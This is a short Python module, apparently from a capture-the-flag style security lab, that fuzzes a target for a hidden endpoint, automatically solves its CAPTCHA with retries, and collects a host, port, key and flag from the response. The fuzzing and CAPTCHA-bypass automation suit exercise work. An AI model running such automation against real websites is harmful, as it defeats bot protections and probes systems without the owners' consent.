import requests

from src.tp3.utils.captcha import solve_captcha
from src.tp3.utils.config import logger
from src.tp3.utils.fuzzer import find_hidden_endpoint


def breach_web(target: str, max_attempts: int = 5):
    """Fuzz la cible, resout le CAPTCHA (avec plusieurs tentatives), renvoie (host, port, key, flag1)."""
    endpoint = find_hidden_endpoint(target)
    if endpoint is None:
        raise RuntimeError("Endpoint cache introuvable")

    session = requests.Session()

    for attempt in range(1, max_attempts + 1):
        session.get(endpoint, timeout=5)  # genere un nouveau code captcha en session
        captcha_bytes = session.get(f"{target}/captcha.png", timeout=5).content
        code = solve_captcha(captcha_bytes)
        logger.info(f"Tentative {attempt}/{max_attempts} - CAPTCHA lu : {code}")

        resp = session.post(endpoint, data={"captcha": code}, timeout=5)
        data = resp.json()
        if "error" not in data:
            return data["host"], data["port"], data["key"], data["flag1"]

        logger.warning(f"CAPTCHA refuse (tentative {attempt}), nouvel essai")

    raise RuntimeError("CAPTCHA jamais resolu apres plusieurs tentatives")